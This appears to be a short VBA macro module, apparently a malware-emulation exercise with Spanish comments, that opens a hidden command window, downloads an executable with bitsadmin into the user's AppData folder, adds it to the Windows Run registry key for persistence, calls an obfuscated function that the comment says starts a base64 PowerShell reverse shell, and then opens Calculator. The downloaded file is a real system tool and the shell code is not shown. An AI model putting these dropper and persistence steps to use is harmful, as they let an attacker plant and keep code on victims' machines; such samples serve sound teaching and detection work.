Module mainModule
    Sub meow()

        'Realizamos una descarga con bitsadmin de un ejecutable sospechoso
        Dim shell
        Dim out
        shell = VBA.CreateObject("WScript.Shell")
        out = shell.Run("C:\Windows\System32\cmd.exe /k %windir%\System32\bitsadmin.exe /transfer MALWAREVIU /download /priority normal https://live.sysinternals.com/autoruns.exe  %APPDATA%\autoruns.exe", vbHide)

        'Escribimos en el registro que es lo que queremos CurrentVersion\\Run
        out = shell.Run("C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /V Malware-VIU /t REG_SZ /F /D %APPDATA%\autoruns.exe", vbHide)

        'Lanzamos powershell con el base64 ofuscado de la reverse shell

        bKSVZPVP()

        out = shell.Run("C:\Windows\System32\cmd.exe /k calc.exe", vbNormalFocus)
    End Sub

